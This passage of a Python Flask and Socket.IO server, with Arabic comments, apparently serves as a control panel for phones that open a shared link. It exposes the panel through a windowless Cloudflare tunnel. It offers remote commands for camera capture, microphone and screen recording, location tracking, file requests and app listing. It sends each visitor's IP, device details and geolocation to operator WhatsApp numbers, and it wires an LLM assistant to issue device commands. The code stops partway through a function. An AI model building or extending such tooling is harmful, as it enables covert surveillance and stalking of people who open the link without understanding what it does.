import os
import sqlite3
import uuid
import base64
import logging
import secrets
import socket
import subprocess
import threading
import ipaddress
import mimetypes
import struct
import time
from datetime import datetime, timedelta, timezone
from io import BytesIO
from functools import wraps
from dotenv import load_dotenv
import re

# تفعيل gevent monkey patching لتحسين الأداء ومنع التعليق
from gevent import monkey
monkey.patch_all()

# تحميل متغيرات البيئة
load_dotenv()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))


def _resolve_path(env_name, default_relative_path):
    configured_path = os.getenv(env_name, '').strip() or default_relative_path
    if not os.path.isabs(configured_path):
        configured_path = os.path.join(BASE_DIR, configured_path)
    return os.path.normpath(configured_path)


def _ensure_parent_dir(path):
    parent_dir = os.path.dirname(path)
    if parent_dir:
        os.makedirs(parent_dir, exist_ok=True)


LOG_FILE_PATH = _resolve_path('LOG_FILE_PATH', os.path.join('logs', 'project_x.log'))
DATABASE_PATH = _resolve_path('DATABASE_PATH', os.path.join('database', 'project_x.db'))
UPLOAD_FOLDER = _resolve_path('UPLOAD_FOLDER', 'uploads')
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')

# ============ استيراد المكتبات الخارجية ============
try:
    from flask import Flask, render_template, request, jsonify, send_file, send_from_directory, session, redirect
    from flask_socketio import SocketIO, emit, join_room, leave_room, disconnect
    from flask_cors import CORS
    from werkzeug.security import generate_password_hash, check_password_hash
    from werkzeug.utils import secure_filename
    import qrcode
    import requests
except ImportError as e:
    print(f"❌ خطأ: مكتبة مفقودة ({e.name}). يرجى تثبيت المتطلبات.")
    exit(1)

# ============ إصلاح توافق المكتبات (Monkey Patch) ============
# حل مشكلة TypeError: can only concatenate str (not "bytes") to str في engineio
import engineio.payload

original_payload_encode = engineio.payload.Payload.encode

def safe_payload_encode(self, b64=False):
    try:
        return original_payload_encode(self, b64=b64)
    except TypeError:
        # في حالة حدوث الخطأ، نقوم بالتجميع اليدوي كـ bytes ثم التحويل
        encoded_payload = b''
        for pkt in self.packets:
            encoded_packet = pkt.encode(b64=b64)
            if isinstance(encoded_packet, str):
                encoded_packet = encoded_packet.encode('utf-8')
            encoded_payload += encoded_packet
        return encoded_payload if b64 else encoded_payload.decode('utf-8')

engineio.payload.Payload.encode = safe_payload_encode

# إنشاء مجلد السجلات
_ensure_parent_dir(LOG_FILE_PATH)

# ============ إعدادات السجلات (Logging) ============
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE_PATH, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============ إعدادات التطبيق ============
app = Flask(__name__)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = os.getenv('SESSION_COOKIE_SAMESITE', 'Lax').strip() or 'Lax'
app.config['SESSION_COOKIE_SECURE'] = os.getenv('SESSION_COOKIE_SECURE', '0').strip().lower() in {'1', 'true', 'yes'}
app.config['PREFERRED_URL_SCHEME'] = 'https' if app.config['SESSION_COOKIE_SECURE'] else 'http'
app.permanent_session_lifetime = timedelta(hours=int(os.getenv('SESSION_TTL_HOURS', '12')))

# تحسين الأداء: إضافة ترويسات التخزين المؤقت
@app.after_request
def add_cache_headers(response):
    """إضافة ترويسات التخزين المؤقت لتسريع التطبيق"""
    if request.path.startswith('/static') or request.path.startswith('/uploads'):
        response.headers["Cache-Control"] = "public, max-age=3600"
    else:
        # منع التخزين المؤقت للصفحات الديناميكية
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
    return response

# تحميل الإعدادات من متغيرات البيئة بشكل آمن
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', secrets.token_hex(32))
app.config['JWT_SECRET'] = os.getenv('JWT_SECRET', secrets.token_hex(32))
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['DATABASE_PATH'] = DATABASE_PATH
app.config['TEMPLATES_DIR'] = TEMPLATES_DIR
app.config['LOG_FILE_PATH'] = LOG_FILE_PATH
app.config['MAX_CONTENT_LENGTH'] = int(os.getenv('MAX_FILE_SIZE', 50 * 1024 * 1024))  # 50MB افتراضي
app.config['ALLOWED_EXTENSIONS'] = {'jpg', 'jpeg', 'png', 'mp4', 'webm', 'mp3', 'wav', 'mov', 'avi'}
app.config['AI_PROVIDER'] = os.getenv('AI_PROVIDER', 'auto').strip().lower()
app.config['XAI_API_KEY'] = os.getenv('XAI_API_KEY', '').strip()
app.config['XAI_MODEL'] = os.getenv('XAI_MODEL', 'grok-3-latest').strip()
app.config['XAI_BASE_URL'] = os.getenv('XAI_BASE_URL', 'https://api.x.ai/v1').strip()
app.config['GROQ_API_KEY'] = os.getenv('GROQ_API_KEY', '').strip()
app.config['GROQ_MODEL'] = os.getenv('GROQ_MODEL', 'llama-3.3-70b-versatile').strip()
app.config['GROQ_BASE_URL'] = os.getenv('GROQ_BASE_URL', 'https://api.groq.com/openai/v1').strip()
app.config['HF_API_KEY'] = os.getenv('HF_API_KEY', os.getenv('HUGGINGFACE_API_KEY', '')).strip()
app.config['HF_MODEL'] = os.getenv('HF_MODEL', 'deepseek-ai/DeepSeek-R1:fastest').strip()
app.config['HF_BASE_URL'] = os.getenv('HF_BASE_URL', 'https://router.huggingface.co/v1').strip()
app.config['WAWP_BASE_URL'] = os.getenv('WAWP_BASE_URL', 'https://api.wawp.net').strip().rstrip('/')
app.config['WAWP_ACCESS_TOKEN'] = os.getenv('WAWP_ACCESS_TOKEN', '').strip()
app.config['WAWP_INSTANCE_ID'] = os.getenv('WAWP_INSTANCE_ID', '').strip()
app.config['WAWP_DEFAULT_MESSAGE'] = os.getenv('WAWP_DEFAULT_MESSAGE', 'السلام عليم').strip()
app.config['WAWP_TRIGGER_KEYWORD'] = os.getenv('WAWP_TRIGGER_KEYWORD', '').strip().lower()
app.config['WAWP_LINK_MESSAGE_TEMPLATE'] = os.getenv('WAWP_LINK_MESSAGE_TEMPLATE', 'هذا هو الرابط: {link}').strip()
app.config['WAWP_WEBHOOK_SECRET'] = os.getenv('WAWP_WEBHOOK_SECRET', '').strip()
app.config['WAWP_DEFAULT_COUNTRY_CODE'] = os.getenv('WAWP_DEFAULT_COUNTRY_CODE', '20').strip()
app.config['WAWP_SITE_VISITOR_NOTIFY_NUMBER'] = os.getenv('WAWP_SITE_VISITOR_NOTIFY_NUMBER', '').strip()
app.config['WAWP_SITE_VISITOR_NOTIFY_NUMBERS'] = os.getenv('WAWP_SITE_VISITOR_NOTIFY_NUMBERS', '').strip()
app.config['VISIT_NOTIFY_MIN_INTERVAL_SECONDS'] = int(os.getenv('VISIT_NOTIFY_MIN_INTERVAL_SECONDS', '1800'))
app.config['WAWP_FALLBACK_BASE_URLS'] = os.getenv('WAWP_FALLBACK_BASE_URLS', '').strip()
app.config['WAWP_CONNECT_TIMEOUT'] = float(os.getenv('WAWP_CONNECT_TIMEOUT', '8'))
app.config['WAWP_READ_TIMEOUT'] = float(os.getenv('WAWP_READ_TIMEOUT', '35'))
app.config['WAWP_SEND_RETRIES'] = int(os.getenv('WAWP_SEND_RETRIES', '2'))
app.config['WAWP_RETRY_BACKOFF_SECONDS'] = float(os.getenv('WAWP_RETRY_BACKOFF_SECONDS', '1.4'))

# CORS محسّن
CORS(app, resources={r"/*": {"origins": "*", "methods": ["GET", "POST", "OPTIONS"]}})

# إعداد Socket.IO (استخدام threading مع polling لضمان الاستقرار)
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode='gevent',
    ping_timeout=60,
    ping_interval=25,
    logger=False,
    engineio_logger=False,
        max_http_buffer_size=100000000
)
    
# إنشاء المجلدات الضرورية
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
_ensure_parent_dir(app.config['DATABASE_PATH'])
os.makedirs(app.config['TEMPLATES_DIR'], exist_ok=True)
os.makedirs(os.path.join(BASE_DIR, 'static'), exist_ok=True)

# ============ المتغيرات العامة ============
connected_devices = {}
public_url = None
active_sessions = {}
socket_sessions = {}
whatsapp_pending_replies = {}
whatsapp_seen_events = {}
whatsapp_conversations = {}
site_visit_notifications = {}
anonymous_visit_notifications = {}
location_permission_stats = {
    'granted': 0,
    'denied': 0,
    'unsupported': 0,
    'error': 0,
    'updated_at': '',
}
permission_status_stats = {
    'camera': {'granted': 0, 'denied': 0, 'unsupported': 0, 'error': 0},
    'microphone': {'granted': 0, 'denied': 0, 'unsupported': 0, 'error': 0},
    'notifications': {'granted': 0, 'denied': 0, 'unsupported': 0, 'error': 0},
    'updated_at': '',
}
permission_notifications = {}
whatsapp_state_lock = threading.Lock()
whatsapp_last_provider_sync = datetime.fromtimestamp(0, timezone.utc)
whatsapp_sync_lock = threading.Lock()
site_visit_notify_lock = threading.Lock()
location_permission_lock = threading.Lock()
permission_status_lock = threading.Lock()
permission_notify_lock = threading.Lock()
device_identity_lock = threading.Lock()
device_identity_cache = {}
pending_location_requests = {}
pending_location_lock = threading.Lock()

MAX_WHATSAPP_MESSAGES_PER_CHAT = 300

CLOUDFLARED_RELEASE_URLS = {
    'amd64': 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe',
    'arm64': 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-arm64.exe',
}

SAFE_COMMANDS = {
    'camera_on',
    'camera_off',
    'camera_back',
    'camera_front',
    'capture_photo',
    'burst_capture',
    'mic_on',
    'mic_off',
    'start_audio_recording',
    'stop_audio_recording',
    'start_recording',
    'stop_recording',
    'location',
    'stop_location',
    'screen_share_start',
    'screen_share_stop',
    'screen_record_start',
    'screen_record_stop',
    'request_file_images',
    'request_file_videos',
    'request_file_all',
    'get_apps',
    'torch_on',
    'torch_off',
    'vibrate',
    'tts_speak',
    'play_alarm',
}

# ============ دوال مساعدة الأمان ============
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']


def normalize_device_id(device_id):
    safe_device_id = secure_filename(str(device_id or '').strip())
    return safe_device_id[:64]


def _read_pe_machine(file_path):
    try:
        with open(file_path, 'rb') as binary_file:
            data = binary_file.read(0x200)
            if len(data) < 0x40 or data[:2] != b'MZ':
                return None
            e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
            if e_lfanew + 6 > len(data):
                with open(file_path, 'rb') as full_file:
                    full_data = full_file.read(e_lfanew + 6)
                if len(full_data) < e_lfanew + 6:
                    return None
                return struct.unpack_from('<H', full_data, e_lfanew + 4)[0]
            return struct.unpack_from('<H', data, e_lfanew + 4)[0]
    except Exception:
        return None


def _get_cloudflared_download_target():
    architecture = os.environ.get('PROCESSOR_ARCHITECTURE', '').lower()
    if architecture in {'amd64', 'x86_64'}:
        return 'amd64'
    if architecture in {'arm64'}:
        return 'arm64'
    return 'amd64'


def _ensure_cloudflared_binary():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    candidates = [
        os.path.join(base_dir, 'cloudflared-windows-amd64.exe'),
        os.path.join(base_dir, 'cloudflared-windows-arm64.exe'),
        os.path.join(base_dir, 'cloudflared.exe'),
    ]

    expected_machine = {
        'amd64': 0x8664,
        'arm64': 0xAA64,
    }.get(_get_cloudflared_download_target(), 0x8664)

    for candidate in candidates:
        if not os.path.exists(candidate):
            continue
        machine = _read_pe_machine(candidate)
        if machine == expected_machine:
            return candidate
        logger.warning(
            f'cloudflared غير متوافق مع ويندوز الحالي ({candidate})، سيتم البحث عن نسخة مناسبة.'
        )

    download_key = _get_cloudflared_download_target()
    download_url = CLOUDFLARED_RELEASE_URLS.get(download_key)
    if not download_url:
        return None

    target_path = os.path.join(base_dir, f'cloudflared-windows-{download_key}.exe')
    try:
        logger.info(f'تحميل Cloudflare Tunnel المناسب لـ Windows ({download_key})...')
        response = requests.get(download_url, stream=True, timeout=120)
        response.raise_for_status()
        with open(target_path, 'wb') as target_file:
            for chunk in response.iter_content(chunk_size=1024 * 1024):
                if chunk:
                    target_file.write(chunk)

        machine = _read_pe_machine(target_path)
        if machine != expected_machine:
            logger.error('تم تنزيل cloudflared لكن معمارية الملف لا تزال غير صحيحة.')
            return None
        return target_path
    except Exception as download_error:
        logger.error(f'فشل تنزيل cloudflared المناسب: {download_error}')
        return None

def get_current_user_id():
    return session.get('user_id')

def login_required(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        if not get_current_user_id():
            if not request.path.startswith('/api'):
                return redirect('/login')
            return jsonify({'success': False, 'error': 'غير مصرح', 'code': 'auth_required'}), 401
        return func(*args, **kwargs)
    return wrapper

def get_safe_user_for_socket(auth_user_id):
    session_user_id = get_current_user_id()
    if not session_user_id:
        return None
    if auth_user_id and auth_user_id != session_user_id:
        return None
    return session_user_id

class AIServiceError(Exception):
    def __init__(self, message, status_code=500):
        super().__init__(message)
        self.status_code = status_code
        self.message = message

def resolve_ai_runtime():
    """تحديد المزود وإعداداته تلقائياً (xAI أو Groq)."""
    requested_provider = app.config.get('AI_PROVIDER', 'auto').strip().lower()
    if requested_provider not in {'auto', 'xai', 'groq'}:
        requested_provider = 'auto'

    xai_key = app.config.get('XAI_API_KEY', '').strip()
    groq_key = app.config.get('GROQ_API_KEY', '').strip()

    # توافق خلفي: في بعض الإعدادات يوضع مفتاح Groq داخل XAI_API_KEY
    if not groq_key and xai_key.startswith('gsk_'):
        groq_key = xai_key

    if requested_provider == 'xai':
        provider = 'xai'
    elif requested_provider == 'groq':
        provider = 'groq'
    elif groq_key and not xai_key:
        provider = 'groq'
    elif xai_key.startswith('gsk_'):
        provider = 'groq'
    else:
        provider = 'xai'

    if provider == 'groq':
        api_key = groq_key or xai_key
        base_url = app.config.get('GROQ_BASE_URL', 'https://api.groq.com/openai/v1').strip().rstrip('/')
        model = app.config.get('GROQ_MODEL', '').strip()
        if not model:
            # إذا لم يُضبط GROQ_MODEL نستخدم نموذج مناسب بدلاً من grok-*.
            legacy_model = app.config.get('XAI_MODEL', '').strip()
            if legacy_model and not legacy_model.lower().startswith('grok'):
                model = legacy_model
            else:
                model = 'llama-3.3-70b-versatile'
    else:
        api_key = xai_key
        base_url = app.config.get('XAI_BASE_URL', 'https://api.x.ai/v1').strip().rstrip('/')
        model = app.config.get('XAI_MODEL', 'grok-3-latest').strip() or 'grok-3-latest'

    if not api_key:
        raise ValueError('AI_API_KEY غير مضبوط. أضف XAI_API_KEY أو GROQ_API_KEY في ملف .env')

    if not base_url:
        base_url = 'https://api.groq.com/openai/v1' if provider == 'groq' else 'https://api.x.ai/v1'

    return provider, api_key, base_url, model

def local_ai_fallback(user_message, context_text='', reason=''):
    msg = (user_message or '').strip().lower()
    ctx = (context_text or '').strip()

    # ردود سريعة مفيدة أثناء تعطل خدمة الذكاء الاصطناعي
    if any(k in msg for k in ['camera', 'cam', 'كاميرا', 'ميك', 'mic', 'audio', 'صوت']):
        return (
            'وضع احتياطي: تحقق من صلاحيات الكاميرا/الميكروفون في المتصفح، ثم اضغط "منح الصلاحيات" '
            'وأعد تشغيل الاتصال من صفحة الهاتف. تأكد أيضًا أنك تستخدم رابط HTTPS العام.'
        )

    if any(k in msg for k in ['ngrok', 'رابط', 'public', 'عام']):
        return (
            'وضع احتياطي: إذا انقطع الرابط العام، أعد تشغيل الخادم وسيتم إنشاء رابط جديد تلقائيًا. '
            'تأكد من صحة NGROK_AUTH_TOKEN في ملف .env.'
        )

    if any(k in msg for k in ['ai', 'ذكاء', 'مساعد']):
        return (
            'وظيفتي هنا: مساعد تشغيل سريع للوحة التحكم، يساعدك في التشخيص (كاميرا/ميكروفون/رفع ملفات/رابط عام) '
            'ويعطي خطوات إصلاح مباشرة.'
        )

    context_note = f' (السياق: {ctx})' if ctx else ''
    reason_note = f' سبب التعطل: {reason}' if reason else ''
    return (
        'وضع احتياطي: خدمة AI غير متاحة حاليًا، لكن يمكنني المساعدة بخطوات تشغيل يدوية. '
        'اكتب المشكلة بشكل محدد مثل: "الكاميرا لا تعمل" أو "الرابط العام لا يفتح".'
        f'{context_note}{reason_note}'
    )


def start_cloudflared_tunnel(port):
    cloudflared_path = _ensure_cloudflared_binary()

    if not cloudflared_path:
        logger.warning('تعذر تجهيز cloudflared المناسب، سيتم تشغيل السيرفر محليًا فقط.')
        return None

    command = [
        cloudflared_path,
        'tunnel',
        '--url', f'http://127.0.0.1:{port}',
        '--no-autoupdate',
    ]

    logger.info('بدء Cloudflare Tunnel...')
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        encoding='utf-8',
        errors='replace',
        creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
    )

    def watch_output():
        global public_url
        url_pattern = re.compile(r'https://[a-z0-9-]+\.trycloudflare\.com', re.IGNORECASE)

        try:
            assert process.stdout is not None
            for line in process.stdout:
                logger.info(line.rstrip())
                if public_url:
                    continue
                match = url_pattern.search(line)
                if match:
                    public_url = match.group(0).rstrip('/')
                    logger.info(f'✅ Cloudflare public URL: {public_url}')
        except Exception as watch_error:
            logger.warning(f'تعذر قراءة مخرجات Cloudflare Tunnel ({watch_error})')

    threading.Thread(target=watch_output, daemon=True).start()
    return process

def ask_primary_ai_assistant(user_message, context_text='', system_instruction=''):
    provider, api_key, base_url, model = resolve_ai_runtime()
    provider_label = 'Groq' if provider == 'groq' else 'xAI'
    model_env_name = 'GROQ_MODEL' if provider == 'groq' else 'XAI_MODEL'
    key_env_name = 'GROQ_API_KEY' if provider == 'groq' else 'XAI_API_KEY'

    base_prompt = (
        'You are an operations assistant for a device management dashboard. '
        'You have FULL control over the connected devices and knowledge of the source code. '
        'To execute a command on the device, include the tag [[CMD:command_name]] in your response. '
        'Example: "I will turn on the camera [[CMD:camera_on]]". '
        'If asked to modify code, provide the full Python or HTML code block. '
        'Answer briefly, clearly, and safely.'
    )

    system_prompt = f"{base_prompt}\n{system_instruction}"

    messages = [
        {'role': 'system', 'content': system_prompt},
    ]

    if context_text:
        messages.append({'role': 'system', 'content': f'Context: {context_text}'})

    messages.append({'role': 'user', 'content': user_message})

    payload = {
        'model': model,
        'messages': messages,
        'temperature': 0.2,
        'max_tokens': 500,
    }

    headers = {
        'Authorization': f'Bearer {api_key}',
        'Content-Type': 'application/json',
    }

    try:
        response = requests.post(
            f'{base_url}/chat/completions',
            json=payload,
            headers=headers,
            timeout=45,
        )
    except requests.RequestException as e:
        raise AIServiceError(f'تعذر الاتصال بخدمة {provider_label}: {e}', 502)

    if response.status_code >= 400:
        response_error = ''
        response_code = ''
        try:
            err_json = response.json()
            response_error = str(err_json.get('error', '')).strip()
            response_code = str(err_json.get('code', '')).strip()
        except Exception:
            response_error = (response.text or '').strip()

        if response.status_code == 429:
            raise AIServiceError(
                f'{provider_label} غير متاح الآن: تم استهلاك الرصيد أو الوصول لحد الصرف الشهري. '
                'اشحن الرصيد/ارفع حد الصرف ثم أعد المحاولة.',
                429,
            )

        if response.status_code in (401, 403):
            raise AIServiceError(
                f'مفتاح {provider_label} غير صالح أو لا يملك صلاحية. راجع {key_env_name}.',
                response.status_code,
            )

        if response.status_code == 400 and 'model' in response_error.lower() and 'not found' in response_error.lower():
            raise AIServiceError(
                f'الموديل الحالي غير متاح ({model}). غيّر {model_env_name} إلى موديل صالح.',
                400,
            )

        detail = response_error or response_code or response.text[:250]
        raise AIServiceError(f'{provider_label} API error ({response.status_code}): {detail}', response.status_code)

    data = response.json()
    choices = data.get('choices') or []
    if not choices:
        raise AIServiceError(f'{provider_label} API returned no choices', 502)

    message = choices[0].get('message', {})
    content = (message.get('content') or '').strip()
    if not content:
        raise AIServiceError(f'{provider_label} API returned an empty response', 502)

    return content


def normalize_phone_to_chat_id(phone_number):
    raw = str(phone_number or '').strip()
    digits = re.sub(r'\D', '', raw)
    if not digits:
        raise ValueError('رقم الهاتف غير صالح')

    default_cc = re.sub(r'\D', '', str(app.config.get('WAWP_DEFAULT_COUNTRY_CODE', '20') or '20'))
    if not default_cc:
        default_cc = '20'

    # +2010... أو 002010... => رقم دولي كامل
    if raw.startswith('+'):
        normalized_digits = digits
    elif digits.startswith('00') and len(digits) > 4:
        normalized_digits = digits[2:]
    # إذا الرقم بالفعل يبدأ بكود الدولة الافتراضي نرسله كما هو
    elif digits.startswith(default_cc) and len(digits) >= (len(default_cc) + 6):
        normalized_digits = digits
    # أرقام محلية تبدأ بـ 0 مثل 011... => نضيف كود الدولة ونحذف الصفر
    elif digits.startswith('0') and len(digits) >= 9:
        normalized_digits = f"{default_cc}{digits[1:]}"
    # أرقام محلية بدون صفر بادئ (غالبًا 10-11 رقم) => نضيف كود الدولة
    elif len(digits) in {9, 10, 11}:
        normalized_digits = f"{default_cc}{digits}"
    else:
        normalized_digits = digits

    if len(normalized_digits) < 8:
        raise ValueError('رقم الهاتف غير مكتمل')

    return f'{normalized_digits}@c.us'.lower()


def canonicalize_chat_id(chat_id):
    value = str(chat_id or '').strip().lower()
    if not value:
        return ''
    if value.endswith('@s.whatsapp.net'):
        value = value.replace('@s.whatsapp.net', '@c.us')
    return value


def extract_phone_digits_from_chat_id(chat_id):
    base = str(chat_id or '').split('@', 1)[0]
    return re.sub(r'\D', '', base)


def get_phone_page_link():
    if public_url:
        return f"{public_url.rstrip('/')}/phone"
    local_ip = get_network_info()
    return f"http://{local_ip}:9090/phone"


def format_device_display_name(raw_name, platform):
    name = str(raw_name or '').strip() or 'Unknown Device'
    os_name = str(platform or '').strip() or 'Unknown OS'

    # إذا الاسم يحتوي النظام بالفعل لا نكرره.
    if os_name.lower() in name.lower():
        return name
    return f"{name} ({os_name})"


def get_site_visit_notify_numbers():
    """إرجاع قائمة أرقام إشعارات الزيارات مع دعم رقم واحد أو عدة أرقام."""
    primary = str(app.config.get('WAWP_SITE_VISITOR_NOTIFY_NUMBER', '') or '').strip()
    bulk_raw = str(app.config.get('WAWP_SITE_VISITOR_NOTIFY_NUMBERS', '') or '').strip()

    candidates = []
    if primary:
        candidates.append(primary)

    if bulk_raw:
        for item in bulk_raw.split(','):
            number = str(item or '').strip()
            if number and number not in candidates:
                candidates.append(number)

    return candidates


def is_likely_bot_user_agent(user_agent):
    ua = str(user_agent or '').lower()
    if not ua:
        return True
    bot_markers = (
        'bot', 'crawler', 'spider', 'headless', 'preview', 'monitor', 'python-requests',
        'curl', 'wget', 'httpclient', 'uptime', 'insomnia', 'postman', 'checkly',
    )
    return any(marker in ua for marker in bot_markers)


def is_likely_real_mobile_client(payload, user_agent, headers=None):
    ua = str(user_agent or '').lower()
    if is_likely_bot_user_agent(ua):
        return False

    headers = headers or {}
    ch_mobile = str(headers.get('Sec-CH-UA-Mobile', '') or '').strip()
    mobile_hint = any(k in ua for k in ('android', 'iphone', 'ipad', 'mobile')) or ch_mobile == '?1'
    desktop_hint = any(k in ua for k in ('windows nt', 'macintosh', 'x11', 'linux x86_64', 'cros'))

    try:
        touch_points = int(payload.get('touchPoints', 0) or 0)
    except Exception:
        touch_points = 0
    try:
        viewport_w = int(payload.get('viewportW', 0) or 0)
    except Exception:
        viewport_w = 0

    # مسار أساسي: UA/Client-Hints تشير إلى هاتف أو جهاز لوحي.
    if mobile_hint and (touch_points >= 1 or 240 <= viewport_w <= 1400):
        return True

    # مسار احتياطي: بعض متصفحات الهاتف تخفي كلمة Mobile، لذا نعتمد على اللمس + عرض الشاشة.
    if not desktop_hint and touch_points >= 2 and 240 <= viewport_w <= 1024:
        return True

    # مسار عملي مرن: طالما ليس بوتًا ويوجد معلومات عرض من المتصفح، نسمح بالتمرير.
    # هذا يمنع ضياع الزيارات الحقيقية عندما يغيّر المتصفح User-Agent بشكل غير متوقع.
    if 200 <= viewport_w <= 3000:
        return True

    return False


def get_wawp_webhook_url():
    if not public_url:
        return ''

    base = f"{public_url.rstrip('/')}/api/whatsapp/webhook"
    secret = app.config.get('WAWP_WEBHOOK_SECRET', '').strip()
    if secret:
        return f"{base}?secret={secret}"
    return base


def cleanup_whatsapp_state():
    now = datetime.now(timezone.utc)

    for event_id, ts in list(whatsapp_seen_events.items()):
        if (now - ts).total_seconds() > 7200:
            whatsapp_seen_events.pop(event_id, None)

    for chat_id, item in list(whatsapp_pending_replies.items()):
        created_at = item.get('created_at')
        if not created_at:
            whatsapp_pending_replies.pop(chat_id, None)
            continue
        if (now - created_at).total_seconds() > 86400:
            whatsapp_pending_replies.pop(chat_id, None)


def notify_site_visit_on_whatsapp(device_id, raw_name, platform, geo_link=''):
    notify_number = str(app.config.get('WAWP_SITE_VISITOR_NOTIFY_NUMBER', '') or '').strip()
    if not notify_number:
        return

    now = datetime.now(timezone.utc)
    with site_visit_notify_lock:
        last_sent = site_visit_notifications.get(device_id)
        if last_sent and (now - last_sent).total_seconds() < 120:
            return
        site_visit_notifications[device_id] = now

        if len(site_visit_notifications) > 1000:
            cutoff = now - timedelta(hours=24)
            for known_device, sent_at in list(site_visit_notifications.items()):
                if sent_at < cutoff:
                    site_visit_notifications.pop(known_device, None)

    try:
        chat_id = normalize_phone_to_chat_id(notify_number)
        display_name = format_device_display_name(raw_name, platform)
        geo_link = str(geo_link or '').strip()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message = (
            f"تم الدخول على رابط الموقع من جهاز: {display_name}\n"
            f"Device ID: {device_id}\n"
            f"الموقع الجغرافي: {geo_link or 'غير متوفر'}\n"
            f"الوقت: {timestamp}"
        )
        send_wawp_text(chat_id, message)
        logger.info(f"✅ تم إرسال إشعار دخول الرابط إلى واتساب: {notify_number}")
    except Exception as notify_error:
        logger.warning(f"تعذر إرسال إشعار دخول الرابط إلى واتساب: {notify_error}")


def notify_anonymous_visit_on_whatsapp(visit_key='', visit_meta=None):
    """يرسل إشعار الدخول الأول مع بيانات الجهاز، ثم يرسل الموقع لاحقًا بعد الموافقة."""
    notify_numbers = get_site_visit_notify_numbers()
    if not notify_numbers:
        return

    visit_meta = visit_meta or {}

    now = datetime.now(timezone.utc)
    safe_visit_key = str(visit_key or '').strip() or 'unknown-visitor'
    if len(safe_visit_key) > 200:
        safe_visit_key = safe_visit_key[:200]

    with site_visit_notify_lock:
        min_interval = int(app.config.get('VISIT_NOTIFY_MIN_INTERVAL_SECONDS', 1800) or 1800)
        if min_interval < 30:
            min_interval = 30
        last_sent = anonymous_visit_notifications.get(safe_visit_key)
        if last_sent and (now - last_sent).total_seconds() < min_interval:
            return
        anonymous_visit_notifications[safe_visit_key] = now

        if len(anonymous_visit_notifications) > 2000:
            cutoff = now - timedelta(hours=24)
            for k, ts in list(anonymous_visit_notifications.items()):
                if ts < cutoff:
                    anonymous_visit_notifications.pop(k, None)

    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        device_name = str(visit_meta.get('name', '') or 'Unknown Device').strip()
        platform = str(visit_meta.get('platform', '') or 'Unknown').strip()
        model = str(visit_meta.get('model', '') or 'Unknown').strip()
        device_id = str(visit_meta.get('device_id', '') or 'unknown-device').strip()
        ip_addr = str(visit_meta.get('ip', '') or 'unknown-ip').strip()
        ua_text = str(visit_meta.get('user_agent', '') or 'Unknown UA').strip()[:180]

        message = (
            'تنبيه زيارة جهاز جديد\n'
            f'الاسم: {device_name}\n'
            f'النظام/المنصة: {platform}\n'
            f'الموديل: {model}\n'
            f'Device ID: {device_id}\n'
            f'IP: {ip_addr}\n'
            f'User-Agent: {ua_text}\n'
            'الموقع: سيتم إرساله بعد موافقة المستخدم على صلاحية الموقع.\n'
            f'الوقت: {timestamp}'
        )
        sent_count = 0
        for notify_number in notify_numbers:
            try:
                chat_id = normalize_phone_to_chat_id(notify_number)
                send_wawp_text(chat_id, message)
                sent_count += 1
                logger.info(f'✅ تم إرسال إشعار زيارة عام إلى: {notify_number}')
            except Exception as number_error:
                logger.warning(f'تعذر إرسال إشعار الزيارة إلى {notify_number}: {number_error}')

        if sent_count <= 0:
            raise RuntimeError('لم يتم إرسال الإشعار لأي رقم من أرقام التنبيه')
    except Exception as notify_error:
        logger.warning(f'تعذر إرسال إشعار الزيارة العام: {notify_error}')


def notify_permission_status_on_whatsapp(device_id, raw_name, platform, permission, status):
    """يرسل إشعار واتساب بنتيجة طلب الصلاحية مع منع التكرار السريع."""
    notify_number = str(app.config.get('WAWP_SITE_VISITOR_NOTIFY_NUMBER', '') or '').strip()
    if not notify_number:
        return

    safe_permission = str(permission or '').strip().lower()
    safe_status = str(status or '').strip().lower()
    if safe_permission not in {'camera', 'microphone', 'notifications', 'location'}:
        return
    if safe_status not in {'granted', 'denied', 'unsupported', 'error'}:
        return

    now = datetime.now(timezone.utc)
    key = f"{device_id}:{safe_permission}:{safe_status}"

    with permission_notify_lock:
        last_sent = permission_notifications.get(key)
        if last_sent and (now - last_sent).total_seconds() < 90:
            return
        permission_notifications[key] = now

        if len(permission_notifications) > 2000:
            cutoff = now - timedelta(hours=24)
            for k, ts in list(permission_notifications.items()):
                if ts < cutoff:
                    permission_notifications.pop(k, None)

    status_map = {
        'granted': 'تم المنح ✅',
        'denied': 'تم الرفض ❌',
        'unsupported': 'غير مدعومة ⚠️',
        'error': 'خطأ أثناء الطلب ⚠️',
    }
    permission_map = {
        'camera': 'الكاميرا',
        'microphone': 'الميكروفون',
        'notifications': 'الإشعارات',
        'location': 'الموقع الجغرافي',
    }

    try:
        chat_id = normalize_phone_to_chat_id(notify_number)
        display_name = format_device_display_name(raw_name, platform)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message = (
            'تنبيه صلاحية جديد\n'
            f"الجهاز: {display_name}\n"
            f"Device ID: {device_id}\n"
            f"الصلاحية: {permission_map.get(safe_permission, safe_permission)}\n"
            f"الحالة: {status_map.get(safe_status, safe_status)}\n"
            f"الوقت: {timestamp}"
        )
